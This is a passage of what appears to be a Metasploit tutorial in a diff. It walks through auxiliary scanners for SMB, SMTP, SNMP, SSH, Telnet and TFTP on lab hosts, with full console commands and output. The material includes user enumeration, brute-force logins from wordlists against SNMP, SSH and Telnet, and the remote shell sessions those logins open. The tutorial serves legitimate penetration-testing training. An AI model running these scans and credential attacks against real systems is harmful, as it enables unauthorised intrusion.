+ [*] 192.168.1.160 PIPE(LSARPC) LOCAL(XEN-XP-PATCHED - 5-21-583907252-1801674531-839522115) DOMAIN(HOTZONE - )
+ [*] 192.168.1.161 PIPE(LSARPC) LOCAL(XEN-XP-SP2-BARE - 5-21-583907252-1801674531-839522115) DOMAIN(HOTZONE - )
+ [*] 192.168.1.161 USER=Administrator RID=500
+ [*] 192.168.1.160 USER=Administrator RID=500
+ [*] 192.168.1.150 PIPE(LSARPC) LOCAL(V-XPSP2-SPLOIT- - 5-21-2000478354-1965331169-725345543) DOMAIN(WORKGROUP - )
+ [*] 192.168.1.160 USER=Guest RID=501
+ [*] 192.168.1.150 TYPE=83886081 NAME=Administrator rid=500
+ [*] 192.168.1.161 USER=Guest RID=501
+ [*] 192.168.1.150 TYPE=83886081 NAME=Guest rid=501
+ [*] 192.168.1.160 GROUP=None RID=513
+ [*] 192.168.1.150 TYPE=83886082 NAME=None rid=513
+ [*] 192.168.1.161 GROUP=None RID=513
+ [*] 192.168.1.150 TYPE=83886081 NAME=HelpAssistant rid=1000
+ [*] 192.168.1.150 TYPE=83886084 NAME=HelpServicesGroup rid=1001
+ [*] 192.168.1.150 TYPE=83886081 NAME=SUPPORT_388945a0 rid=1002
+ [*] 192.168.1.150 TYPE=3276804 NAME=SQLServerMSSQLServerADHelperUser$DOOKIE-FA154354 rid=1003
+ [*] 192.168.1.150 TYPE=4 NAME=SQLServer2005SQLBrowserUser$DOOKIE-FA154354 rid=1004
+ ...snip...
+ [*] 192.168.1.160 TYPE=651165700 NAME=SQLServer2005MSSQLServerADHelperUser$XEN-XP-PATCHED rid=1027
+ [*] 192.168.1.160 TYPE=651165700 NAME=SQLServer2005MSSQLUser$XEN-XP-PATCHED$SQLEXPRESS rid=1028
+ [*] 192.168.1.161 USER=HelpAssistant RID=1000
+ [*] 192.168.1.161 TYPE=4 NAME=HelpServicesGroup rid=1001
+ [*] 192.168.1.161 USER=SUPPORT_388945a0 RID=1002
+ [*] 192.168.1.161 USER=victim RID=1004
+ [*] 192.168.1.160 XEN-XP-PATCHED [Administrator, Guest, HelpAssistant, SUPPORT_388945a0, ASPNET ]
+ [*] 192.168.1.150 V-XPSP2-SPLOIT- [ ]
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] 192.168.1.161 XEN-XP-SP2-BARE [Administrator, Guest, HelpAssistant, SUPPORT_388945a0, victim ]
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_lookupsid) >
+
+
+You will notice with credentialed scanning, that you get, as always, a great deal more interesting output, including accounts you likely never knew existed.
+
+**smb_version**
+
+
+The smb_version scanner connects to each workstation in a given range of hosts and determines the version of the SMB service that is running.
+
+
+::
+
+  msf > use auxiliary/scanner/smb/smb_version
+ msf auxiliary(smb_version) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+ msf auxiliary(smb_version) > set RHOSTS 192.168.1.150-165
+ RHOSTS => 192.168.1.150-165
+ msf auxiliary(smb_version) > set THREADS 16
+ THREADS => 16
+ msf auxiliary(smb_version) > run
+
+ [*] 192.168.1.162 is running Windows 7 Enterprise (Build 7600) (language: Unknown) (name:XEN-WIN7-BARE) (domain:HOTZONE)
+ [*] 192.168.1.154 is running Unix Samba 3.0.20-Debian (language: Unknown) (domain:WORKGROUP)
+ [*] 192.168.1.150 is running Windows XP Service Pack 2 (language: English) (name:V-XPSP2-SPLOIT-) (domain:WORKGROUP)
+ [*] Scanned 04 of 16 hosts (025% complete)
+ [*] 192.168.1.160 is running Windows XP Service Pack 3 (language: English) (name:XEN-XP-PATCHED) (domain:HOTZONE)
+ [*] 192.168.1.161 is running Windows XP Service Pack 2 (language: English) (name:XEN-XP-SP2-BARE) (domain:XEN-XP-SP2-BARE)
+ [*] Scanned 11 of 16 hosts (068% complete)
+ [*] Scanned 14 of 16 hosts (087% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+
+
+Running this same scan with a set of credentials will return some different, and perhaps unexpected, results.
+
+::
+
+  msf auxiliary(smb_version) > set SMBPass s3cr3t
+ SMBPass => s3cr3t
+ msf auxiliary(smb_version) > set SMBUser Administrator
+ SMBUser => Administrator
+ msf auxiliary(smb_version) > run
+
+ [*] 192.168.1.160 is running Windows XP Service Pack 3 (language: English) (name:XEN-XP-PATCHED) (domain:XEN-XP-PATCHED)
+ [*] 192.168.1.150 is running Windows XP Service Pack 2 (language: English) (name:V-XPSP2-SPLOIT-) (domain:V-XPSP2-SPLOIT-)
+ [*] Scanned 05 of 16 hosts (031% complete)
+ [*] 192.168.1.161 is running Windows XP Service Pack 2 (language: English) (name:XEN-XP-SP2-BARE) (domain:XEN-XP-SP2-BARE)
+ [*] Scanned 12 of 16 hosts (075% complete)
+ [*] Scanned 14 of 16 hosts (087% complete)
+ [*] Scanned 15 of 16 hosts (093% complete)
+ [*] Scanned 16 of 16 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smb_version) >
+
+Contrary to many other cases, a credentialed scan in this case does not necessarily give better results. If the credentials are not valid on a particular system, you will not get any result back from the scan.
+
+SMTP
+""""""""
+
+**smtp_enum**
+
+The SMTP Enumeration module will connect to a given mail server and use a wordlist to enumerate users that are present on the remote system.
+
+::
+
+  msf > use auxiliary/scanner/smtp/smtp_enum
+ msf auxiliary(smtp_enum) > show options
+
+ Module options (auxiliary/scanner/smtp/smtp_enum):
+
+   Name       Current Setting                                                Required  Description
+   ----       ---------------                                                --------  -----------
+   RHOSTS                                                                    yes       The target address range or CIDR identifier
+   RPORT      25                                                             yes       The target port (TCP)
+   THREADS    1                                                              yes       The number of concurrent threads
+   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
+   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
+
+
+
+Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.
+
+::
+
+  msf auxiliary(smtp_enum) > set RHOSTS 192.168.1.56
+ RHOSTS => 192.168.1.56
+ msf auxiliary(smtp_enum) > run
+
+ [*] 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+
+ [*] Domain Name: localdomain
+ [+] 192.168.1.56:25 - Found user: ROOT
+ [+] 192.168.1.56:25 - Found user: backup
+ [+] 192.168.1.56:25 - Found user: bin
+ [+] 192.168.1.56:25 - Found user: daemon
+ [+] 192.168.1.56:25 - Found user: distccd
+ [+] 192.168.1.56:25 - Found user: ftp
+ [+] 192.168.1.56:25 - Found user: games
+ [+] 192.168.1.56:25 - Found user: gnats
+ [+] 192.168.1.56:25 - Found user: irc
+ [+] 192.168.1.56:25 - Found user: libuuid
+ [+] 192.168.1.56:25 - Found user: list
+ [+] 192.168.1.56:25 - Found user: lp
+ [+] 192.168.1.56:25 - Found user: mail
+ [+] 192.168.1.56:25 - Found user: man
+ [+] 192.168.1.56:25 - Found user: news
+ [+] 192.168.1.56:25 - Found user: nobody
+ [+] 192.168.1.56:25 - Found user: postgres
+ [+] 192.168.1.56:25 - Found user: postmaster
+ [+] 192.168.1.56:25 - Found user: proxy
+ [+] 192.168.1.56:25 - Found user: root
+ [+] 192.168.1.56:25 - Found user: service
+ [+] 192.168.1.56:25 - Found user: sshd
+ [+] 192.168.1.56:25 - Found user: sync
+ [+] 192.168.1.56:25 - Found user: sys
+ [+] 192.168.1.56:25 - Found user: syslog
+ [+] 192.168.1.56:25 - Found user: user
+ [+] 192.168.1.56:25 - Found user: uucp
+ [+] 192.168.1.56:25 - Found user: www-data
+ [-] 192.168.1.56:25 - EXPN : 502 5.5.2 Error: command not recognized
+ [+] 192.168.1.56:25 Users found: ROOT, backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, news, nobody, postgres, postmaster, proxy, root, service, sshd, sync, sys, syslog, user, uucp, www-data
+ [*] 192.168.1.56:25 No e-mail addresses found.
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smtp_enum) >
+
+
+Since the email username and system username are frequently the same, you can now use any enumerated users for further logon attempts against other network services.
+
+
+**smtp_version**
+
+Poorly configured or vulnerable mail servers can often provide an initial foothold into a network but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. The smtp_version module, as its name implies, will scan a range of IP addresses and determine the version of any mail servers it encounters.
+
+::
+
+  msf > use auxiliary/scanner/smtp/smtp_version
+ msf auxiliary(smtp_version) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    25               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+ msf auxiliary(smtp_version) > set RHOSTS 192.168.1.0/24
+ RHOSTS => 192.168.1.0/24
+ msf auxiliary(smtp_version) > set THREADS 254
+ THREADS => 254
+ msf auxiliary(smtp_version) > run
+
+ [*] 192.168.1.56:25 SMTP 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\x0d\x0a
+ [*] Scanned 254 of 256 hosts (099% complete)
+ [*] Scanned 255 of 256 hosts (099% complete)
+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(smtp_version) >
+
+
+SNMP
+""""""""
+
+**snmp_enum**
+
+The snmp_enum module performs detailed enumeration of a host or range of hosts via SNMP similar to the standalone tools snmpenum and snmpcheck.
+
+::
+
+  msf > use auxiliary/scanner/snmp/snmp_enum
+ msf auxiliary(snmp_enum) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMUNITY  public           yes       SNMP Community String
+   RETRIES    1                yes       SNMP Retries
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      161              yes       The target port
+   THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    1                yes       SNMP Timeout
+   VERSION    1                yes       SNMP Version
+
+
+Although you can pass a range of hosts to this module, the output will become quite cluttered and confusing so it is best to simply do one host at a time.
+
+::
+
+  msf auxiliary(snmp_enum) > set RHOSTS 192.168.1.2
+ RHOSTS => 192.168.1.2
+ msf auxiliary(snmp_enum) > run
+
+ [*] System information
+
+ Hostname                : Netgear-GSM7224
+ Description             : GSM7224 L2 Managed Gigabit Switch
+ Contact                 : dookie
+ Location                : Basement
+ Uptime snmp             : 56 days, 00:36:28.00
+ Uptime system           : -
+ System date             : -
+
+ [*] Network information
+
+ IP forwarding enabled   :  no
+ Default TTL             :  64
+ TCP segments received   :  20782
+ TCP segments sent       :  9973
+ TCP segments retrans.   :  9973
+ Input datagrams         :  4052407
+ Delivered datagrams     :  1155615
+ Output datagrams        :  18261
+
+ [*] Network interfaces
+
+ Interface [ up ] Unit: 1 Slot: 0 Port: 1 Gigabit - Level
+
+	Id              : 1
+	Mac address     : 00:0f:b5:fc:bd:24
+	Type            : ethernet-csmacd
+	Speed           : 1000 Mbps
+	Mtu             : 1500
+	In octets       : 3716564861
+	Out octets      : 675201778
+ ...snip...
+ [*] Routing information
+
+     Destination         Next hop             Mask           Metric
+
+         0.0.0.0      5.1.168.192          0.0.0.0                1
+       1.0.0.127        1.0.0.127  255.255.255.255                0
+
+ [*] TCP connections and listening ports
+
+   Local address       Local port   Remote address      Remote port            State
+
+         0.0.0.0               23          0.0.0.0                0           listen
+         0.0.0.0               80          0.0.0.0                0           listen
+         0.0.0.0             4242          0.0.0.0                0           listen
+       1.0.0.127             2222          0.0.0.0                0           listen
+
+ [*] Listening UDP ports
+
+   Local address       Local port
+
+         0.0.0.0                0
+         0.0.0.0              161
+         0.0.0.0              514
+
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(snmp_enum) >
+
+
+**snmp_enumshares**
+
+The snmp_enumshares module is a simple scanner that will query a range of hosts via SNMP to determine any available shares.
+
+::
+
+  msf > use auxiliary/scanner/snmp/snmp_enumshares
+ msf auxiliary(snmp_enumshares) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMUNITY  public           yes       SNMP Community String
+   RETRIES    1                yes       SNMP Retries
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      161              yes       The target port
+   THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    1                yes       SNMP Timeout
+   VERSION    1                yes       SNMP Version >1/2c>
+
+
+We configure the module by setting our RHOSTS range and THREADS value and let it run.
+
+
+::
+
+  msf auxiliary(snmp_enumshares) > set RHOSTS 192.168.1.200-210
+ RHOSTS => 192.168.1.200-210
+ msf auxiliary(snmp_enumshares) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(snmp_enumshares) > run
+
+ [+] 192.168.1.201
+	shared_docs -  (C:\Documents and Settings\Administrator\Desktop\shared_docs)
+ [*] Scanned 02 of 11 hosts (018% complete)
+ [*] Scanned 03 of 11 hosts (027% complete)
+ [*] Scanned 05 of 11 hosts (045% complete)
+ [*] Scanned 07 of 11 hosts (063% complete)
+ [*] Scanned 09 of 11 hosts (081% complete)
+ [*] Scanned 11 of 11 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(snmp_enumshares) >
+
+
+**snmp_enumusers**
+
+The snmp_enumusers module queries a range of hosts via SNMP and gathers a list of usernames on the remote system.
+
+::
+
+  msf > use auxiliary/scanner/snmp/snmp_enumusers
+ msf auxiliary(snmp_enumusers) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMUNITY  public           yes       SNMP Community String
+   RETRIES    1                yes       SNMP Retries
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      161              yes       The target port
+   THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    1                yes       SNMP Timeout
+   VERSION    1                yes       SNMP Version >1/2c>
+
+As with most auxiliary modules, we set our RHOSTS and THREADS value and launch it.
+
+::
+
+  msf auxiliary(snmp_enumusers) > set RHOSTS 192.168.1.200-211
+ RHOSTS => 192.168.1.200-211
+ msf auxiliary(snmp_enumusers) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(snmp_enumusers) > run
+
+ [+] 192.168.1.201 Found Users: ASPNET, Administrator, Guest, HelpAssistant, SUPPORT_388945a0, victim
+ [*] Scanned 02 of 12 hosts (016% complete)
+ [*] Scanned 05 of 12 hosts (041% complete)
+ [*] Scanned 06 of 12 hosts (050% complete)
+ [*] Scanned 07 of 12 hosts (058% complete)
+ [*] Scanned 08 of 12 hosts (066% complete)
+ [*] Scanned 09 of 12 hosts (075% complete)
+ [*] Scanned 11 of 12 hosts (091% complete)
+ [*] Scanned 12 of 12 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(snmp_enumusers) >
+
+
+**snmp_login**
+
+The snmp_login scanner is a module that scans a range of IP addresses to determine the community string for SNMP-enabled devices.
+
+::
+
+  msf > use auxiliary/scanner/snmp/snmp_login
+ msf auxiliary(snmp_login) > show options
+
+ Module options (auxiliary/scanner/snmp/snmp_login):
+
+   Name              Current Setting                                                       Required  Description
+   ----              ---------------                                                       --------  -----------
+   BLANK_PASSWORDS   false                                                                 no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                     yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                 no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                 no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                 no        Add all users in the current database to the list
+   PASSWORD                                                                                no        The password to test
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line
+   RHOSTS                                                                                  yes       The target address range or CIDR identifier
+   RPORT             161                                                                   yes       The target port
+   STOP_ON_SUCCESS   false                                                                 yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                     yes       The number of concurrent threads
+   USER_AS_PASS      false                                                                 no        Try the username as the password for all users
+   VERBOSE           true                                                                  yes       Whether to print output for all attempts
+   VERSION           1                                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)
+
+
+
+We set our RHOSTS and THREADS values while using the default wordlist and let the scanner run.
+
+::
+
+  msf auxiliary(snmp_login) > set RHOSTS 192.168.1.0/24
+ RHOSTS => 192.168.1.0/24
+ msf auxiliary(snmp_login) > set THREADS 254
+ THREADS => 254
+ msf auxiliary(snmp_login) > run
+
+ [+] SNMP: 192.168.1.2 community string: 'public' info: 'GSM7224 L2 Managed Gigabit Switch'
+ [+] SNMP: 192.168.1.199 community string: 'public' info: 'HP ETHERNET MULTI-ENVIRONMENT'
+ [+] SNMP: 192.168.1.2 community string: 'private' info: 'GSM7224 L2 Managed Gigabit Switch'
+ [+] SNMP: 192.168.1.199 community string: 'private' info: 'HP ETHERNET MULTI-ENVIRONMENT'
+ [*] Validating scan results from 2 hosts...
+ [*] Host 192.168.1.199 provides READ-WRITE access with community 'internal'
+ [*] Host 192.168.1.199 provides READ-WRITE access with community 'private'
+ [*] Host 192.168.1.199 provides READ-WRITE access with community 'public'
+ [*] Host 192.168.1.2 provides READ-WRITE access with community 'private'
+ [*] Host 192.168.1.2 provides READ-ONLY access with community 'public'
+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(snmp_login) >
+
+
+Our quick SNMP sweep found both the default public and private community strings of 2 devices on our network. This module can also be a useful tool for network administrators to identify attached devices that are insecurely configured.
+
+SSH
+"""""""
+
+**ssh_login**
+
+The ssh_login module is quite versatile in that it can not only test a set of credentials across a range of IP addresses, but it can also perform brute-force login attempts. We will pass a file to the module containing usernames and passwords separated by a space as shown below.
+
+
+::
+
+  root@kali:~# head /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+ root
+ root !root
+ root Cisco
+ root NeXT
+ root QNX
+ root admin
+ root attack
+ root ax400
+ root bagabu
+ root blablabla
+
+
+Next, we load up the scanner module in Metasploit and set USERPASS_FILE to point to our list of credentials to attempt.
+
+
+::
+
+  msf > use auxiliary/scanner/ssh/ssh_login
+ msf auxiliary(ssh_login) > show options
+
+ Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+ msf auxiliary(ssh_login) > set RHOSTS 192.168.1.154
+ RHOSTS => 192.168.1.154
+ msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+ USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+ msf auxiliary(ssh_login) > set VERBOSE false
+ VERBOSE => false
+
+
+With everything ready to go, we run the module. When a valid credential pair is found, we are presented with a shell on the remote machine.
+
+
+::
+
+  msf auxiliary(ssh_login) > run
+
+ [*] 192.168.1.154:22 - SSH - Starting buteforce
+ [*] Command shell session 1 opened (?? -> ??) at 2010-09-09 17:25:18 -0600
+ [+] 192.168.1.154:22 - SSH - Success: 'msfadmin':'msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(ssh_login) > sessions -i 1
+ [*] Starting interaction with 1...
+
+ id
+ uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+ uname -a
+ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+ exit
+ [*] Command shell session 1 closed.
+ msf auxiliary(ssh_login) >
+
+**ssh_login_pubkey**
+
+Using public key authentication for SSH is highly regarded as being far more secure than using usernames and passwords to authenticate. The caveat to this is that if the private key portion of the key pair is not kept secure, the security of the configuration is thrown right out the window. If, during an engagement, you get access to a private SSH key, you can use the ssh_login_pubkey module to attempt to login across a range of devices.
+
+::
+
+  msf > use auxiliary/scanner/ssh/ssh_login_pubkey
+ msf auxiliary(ssh_login_pubkey) > show options
+
+ Module options (auxiliary/scanner/ssh/ssh_login_pubkey):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   KEY_PATH                           yes       Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub" will be skipped.
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+ msf auxiliary(ssh_login_pubkey) > set KEY_FILE /tmp/id_rsa
+ KEY_FILE => /tmp/id_rsa
+ msf auxiliary(ssh_login_pubkey) > set USERNAME root
+ USERNAME => root
+ msf auxiliary(ssh_login_pubkey) > set RHOSTS 192.168.1.154
+ RHOSTS => 192.168.1.154
+ msf auxiliary(ssh_login_pubkey) > run
+
+ [*] 192.168.1.154:22 - SSH - Testing Cleartext Keys
+ [*] 192.168.1.154:22 - SSH - Trying 1 cleartext key per user.
+ [*] Command shell session 1 opened (?? -> ??) at 2010-09-09 17:17:56 -0600
+ [+] 192.168.1.154:22 - SSH - Success: 'root':'57:c3:11:5d:77:c5:63:90:33:2d:c5:c4:99:78:62:7a' 'uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(ssh_login_pubkey) > sessions -i 1
+ [*] Starting interaction with 1...
+
+ ls
+ reset_logs.sh
+ id
+ uid=0(root) gid=0(root) groups=0(root)
+ exit
+ [*] Command shell session 1 closed.
+ msf auxiliary(ssh_login_pubkey) >
+
+
+Telnet
+"""""""""
+
+**telnet_login**
+
+The telnet_login module will take a list of provided credentials and a range of IP addresses and attempt to login to any Telnet servers it encounters.
+
+::
+
+  msf > use auxiliary/scanner/telnet/telnet_login
+ msf auxiliary(telnet_login) > show options
+
+ Module options (auxiliary/scanner/telnet/telnet_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             23               yes       The target port (TCP)
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+
+This auxiliary module allows you to pass credentials in a number of ways. You can specifically set a username and password, you can pass a list of usernames and a list of passwords for it to iterate through, or you can provide a file that contains usernames and passwords separated by a space.
+
+ We will configure the scanner to use a short usernames file and a passwords file and let it run against our subnet.
+
+ ::
+
+   msf auxiliary(telnet_login) > set BLANK_PASSWORDS false
+ BLANK_PASSWORDS => false
+ msf auxiliary(telnet_login) > set PASS_FILE passwords.txt
+ PASS_FILE => passwords.txt
+ msf auxiliary(telnet_login) > set RHOSTS 192.168.1.0/24
+ RHOSTS => 192.168.1.0/24
+ msf auxiliary(telnet_login) > set THREADS 254
+ THREADS => 254
+ msf auxiliary(telnet_login) > set USER_FILE users.txt
+ USER_FILE => users.txt
+ msf auxiliary(telnet_login) > set VERBOSE false
+ VERBOSE => false
+ msf auxiliary(telnet_login) > run
+
+ [+] 192.168.1.116 - SUCCESSFUL LOGIN root : s00p3rs3ckret
+ [*] Command shell session 1 opened (192.168.1.101:50017 -> 192.168.1.116:23) at 2010-10-08 06:48:27 -0600
+ [+] 192.168.1.116 - SUCCESSFUL LOGIN admin : s00p3rs3ckret
+ [*] Command shell session 2 opened (192.168.1.101:41828 -> 192.168.1.116:23) at 2010-10-08 06:48:28 -0600
+ [*] Scanned 243 of 256 hosts (094% complete)
+ [+] 192.168.1.56 - SUCCESSFUL LOGIN msfadmin : msfadmin
+ [*] Command shell session 3 opened (192.168.1.101:49210 -> 192.168.1.56:23) at 2010-10-08 06:49:07 -0600
+ [*] Scanned 248 of 256 hosts (096% complete)
+ [*] Scanned 250 of 256 hosts (097% complete)
+ [*] Scanned 255 of 256 hosts (099% complete)
+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+
+It seems that our scan has been successful and Metasploit has a few sessions open for us. Let’s see if we can interact with one of them.
+
+::
+
+  msf auxiliary(telnet_login) > sessions -l
+
+ Active sessions
+ ===============
+
+  Id  Type   Information                                    Connection
+  --  ----   -----------                                    ----------
+  1   shell  TELNET root:s00p3rs3ckret (192.168.1.116:23)   192.168.1.101:50017 -> 192.168.1.116:23
+  2   shell  TELNET admin:s00p3rs3ckret (192.168.1.116:23)  192.168.1.101:41828 -> 192.168.1.116:23
+  3   shell  TELNET msfadmin:msfadmin (192.168.1.56:23)     192.168.1.101:49210 -> 192.168.1.56:23
+
+ msf auxiliary(telnet_login) > sessions -i 3
+ [*] Starting interaction with 3...
+
+ id
+ id
+ uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+ msfadmin@metasploitable:~$ exit
+ exit
+ logout
+ [*] Command shell session 3 closed.
+ msf auxiliary(telnet_login) >
+
+**telnet_version**
+
+From a network security perspective, one would hope that Telnet would no longer be in use as everything, including credentials is passed in the clear but the fact is, you will still frequently encounter systems running Telnet, particularly on legacy systems.
+
+ The telnet_version auxiliary module will scan a subnet and fingerprint any Telnet servers that are running. We just need to pass a range of IPs to the module, set our THREADS value, and let it fly.
+
+::
+
+  msf > use auxiliary/scanner/telnet/telnet_version
+ msf auxiliary(telnet_version) > show options
+
+ Module options:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     23               yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+   TIMEOUT   30               yes       Timeout for the Telnet probe
+   USERNAME                   no        The username to authenticate as
+
+ msf auxiliary(telnet_version) > set RHOSTS 192.168.1.0/24
+ RHOSTS => 192.168.1.0/24
+ msf auxiliary(telnet_version) > set THREADS 254
+ THREADS => 254
+ msf auxiliary(telnet_version) > run
+
+ [*] 192.168.1.2:23 TELNET (GSM7224) \x0aUser:
+ [*] 192.168.1.56:23 TELNET Ubuntu 8.04\x0ametasploitable login:
+ [*] 192.168.1.116:23 TELNET Welcome to GoodTech Systems Telnet Server for Windows NT/2000/XP (Evaluation Copy)\x0a\x0a(C) Copyright 1996-2002 GoodTech Systems, Inc.\x0a\x0a\x0aLogin username:
+ [*] Scanned 254 of 256 hosts (099% complete)
+ [*] Scanned 255 of 256 hosts (099% complete)
+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(telnet_version) >
+
+TFTP
+""""""""
+
+**tftpbrute**
+
+TFTP servers can contain a wealth of valuable information including backup files, router config files, and much more. The tftpbrute module will take list of filenames and brute-force a TFTP server to determine if the files are present.
+
+::
+
+  msf > use auxiliary/scanner/tftp/tftpbrute
+ msf auxiliary(tftpbrute) > show options
+
+ Module options (auxiliary/scanner/tftp/tftpbrute):
+
+   Name        Current Setting                                          Required  Description
+   ----        ---------------                                          --------  -----------
+   CHOST                                                                no        The local client address
